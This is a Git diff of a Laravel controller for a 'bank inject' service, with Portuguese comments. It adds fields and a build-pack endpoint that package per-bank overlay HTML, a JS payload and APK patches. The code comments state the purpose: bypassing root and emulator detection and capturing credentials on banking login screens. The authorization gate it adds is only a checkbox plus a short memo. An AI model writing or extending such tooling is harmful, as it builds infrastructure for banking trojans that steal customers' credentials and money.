@@ -29,9 +29,15 @@ class BankInjectController extends Controller
      *  raiz/emulador e injeção de JS customizado para capturar credenciais.
      *  O payload modifica apenas as telas de autenticação, não o kernel do sistema."
      * Implementação nesta fase: overlay_html (template do overlay por banco) +
+     * js_payload (JS do laboratório) + protection_patches (pares localizados
+     * file/search/replace aplicados pelo BankInjectService com relatório) +
      * target_bank gravados no BankInject; APK base opcional em file_path.
+     * GATE LEGÍTIMO: qualquer payload (overlay/JS/pares) exige
+     * terms_accepted=true + auth_memo (quem autorizou + escopo do teste).
      */
     public const INJECT_SPEC = 'webview-overlay';
+
+    public const LEGAL_NOTICE = \App\Services\BankInjectService::LEGAL_NOTICE;
 
     public function store(Request $request)
     {
@@ -41,8 +47,15 @@ class BankInjectController extends Controller
             'inject_type' => 'nullable|string|max:255',
             'target_bank' => 'nullable|string|max:255',
             'overlay_html' => 'nullable|string',
+            'js_payload'  => 'nullable|string|max:20000',
+            'protection_patches' => 'nullable|string|max:20000',
+            'terms_accepted' => 'nullable|boolean',
+            'auth_memo'   => 'nullable|string|max:500',
             'apk_file'    => 'nullable|file|max:51200|mimes:apk,zip',
         ]);
+
+        // GATE LEGÍTIMO: payload exige autorização explícita + memo.
+        $this->enforceTermsGate($validated);
 
         $injectType = $validated['inject_type'] ?? $validated['name'] ?? 'default';
         $filePath = null;
@@ -61,11 +74,66 @@ class BankInjectController extends Controller
             'target_bank' => $validated['target_bank'] ?? $validated['bank_name'],
             'inject_type' => $injectType,
             'overlay_html' => $validated['overlay_html'] ?? null,
+            'js_payload'  => $validated['js_payload'] ?? null,
+            'protection_patches' => $validated['protection_patches'] ?? null,
+            'terms_accepted' => (bool) ($validated['terms_accepted'] ?? false),
+            'auth_memo'   => $validated['auth_memo'] ?? null,
             'file_path'   => $filePath,
             'file_size'   => $fileSize,
         ]);
 
         return response()->json(['message' => 'Inject configurado com APK', 'item' => $item, 'inject_spec' => self::INJECT_SPEC], 201);
+    }
+
+    /**
+     * Gate de uso legítimo (422 quando payload sem autorização).
+     */
+    protected function enforceTermsGate(array $validated): void
+    {
+        $hasPayload = !empty($validated['overlay_html'])
+            || !empty($validated['js_payload'])
+            || !empty($validated['protection_patches']);
+
+        if (!$hasPayload) {
+            return;
+        }
+
+        $errors = [];
+        if (empty($validated['terms_accepted'])) {
+            $errors['terms_accepted'] = ['Payload de injeção exige terms_accepted=true (uso autorizado em testes de segurança).'];
+        }
+        if (empty($validated['auth_memo']) || mb_strlen(trim($validated['auth_memo'])) < 10) {
+            $errors['auth_memo'] = ['Informe auth_memo com quem autorizou + escopo do teste (mín. 10 caracteres).'];
+        }
+
+        if (!empty($errors)) {
+            throw \Illuminate\Validation\ValidationException::withMessages($errors);
+        }
+    }
+
+    /**
+     * POST /bank-injects/{id}/build-pack — gera o ZIP auditável do pacote
+     * (overlay.html + payload.js + config.json + README_LEGAL.txt).
+     */
+    public function buildPack(Request $request, BankInject $bankInject)
+    {
+        $this->authorizeOwner($request, $bankInject);
+
+        if (!$bankInject->terms_accepted || empty($bankInject->auth_memo)) {
+            return response()->json([
+                'message' => 'Pacote bloqueado: terms_accepted + auth_memo obrigatórios.',
+                'legal' => self::LEGAL_NOTICE,
+            ], 422);
+        }
+
+        try {
+            $zipPath = \App\Services\BankInjectService::buildPack($bankInject);
+        } catch (\Throwable $e) {
+            return response()->json(['message' => 'Falha ao montar pacote: ' . $e->getMessage()], 500);
+        }
+
+        $name = 'inject_pack_' . $bankInject->id . '_' . Str::slug($bankInject->bank_name) . '.zip';
+        return response()->download($zipPath, $name)->deleteFileAfterSend(true);
     }
 
     public function download($id, Request $request)
@@ -94,6 +162,10 @@ class BankInjectController extends Controller
             'inject_type' => 'sometimes|string|max:255',
             'target_bank' => 'nullable|string|max:255',
             'overlay_html' => 'nullable|string',
+            'js_payload'  => 'nullable|string|max:20000',
+            'protection_patches' => 'nullable|string|max:20000',
+            'terms_accepted' => 'nullable|boolean',
+            'auth_memo'   => 'nullable|string|max:500',
             'status'      => 'sometimes|string|max:50',
             'apk_file'    => 'nullable|file|mimes:apk,zip|max:51200',
         ]);
@@ -114,6 +186,13 @@ class BankInjectController extends Controller
             }
             unset($validated['name']);
         }
+
+        // Gate sobre o estado FINAL (novos valores + existentes).
+        $final = array_merge($bankInject->only([
+            'overlay_html', 'js_payload', 'protection_patches',
+            'terms_accepted', 'auth_memo',
+        ]), $validated);
+        $this->enforceTermsGate($final);
 
         $bankInject->update($validated);
 
